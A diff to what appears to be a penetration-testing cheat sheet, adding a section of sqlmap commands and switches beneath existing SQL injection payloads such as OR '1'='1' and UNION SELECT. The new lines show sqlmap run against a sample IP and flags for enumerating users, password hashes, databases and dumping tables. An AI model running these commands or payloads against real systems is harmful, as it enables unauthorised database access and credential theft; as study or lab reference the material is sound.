@@ -150,7 +150,32 @@ SELECT * FROM items WHERE id='' OR '1' = '1'; -- -'
 SELECT * FROM items WHERE id='' UNION SELECT null, null, null; -- -'
 ```
 
-More SQL-Injection links
+## SQLmap switches
+
+```
+Example:
+
+$sqlmap -u "http://10.10.10.10/get.php?id=1234" -p id --technique=U
+
+$sqlmap -u "http://10.10.10.10/login.php" --data "username=admin&password=1234" -p username --technique=B --banner
+```
+
+* -u URL
+* -p vulnerable parameter
+* --data data to be sent through a POST request (username=admin&password=1234)
+* --banner Retrieve DBMS banner
+* --users Enumerate DBMS users
+* --passwords Enumerate DBMS Users hashed passwords
+* --dbs Enumerate DBMS databases
+* -D Database to enumerate (insert found database name)
+* --tables Enumerates tables in the given database name
+* -T Table name to enumerate (insert table name. E.g, Users, Accounts, etc)
+* --columns Enumerate table columns
+* -C Column name to enumerate (E.g., -C username,password)
+* --dump Dumps all the table entries
+* -r Load HTTP request from a file (Save the request from Burpsuite)
+* --flush-session (Flushes the session files for the current target. Restarts the session again)
+
 
 
 
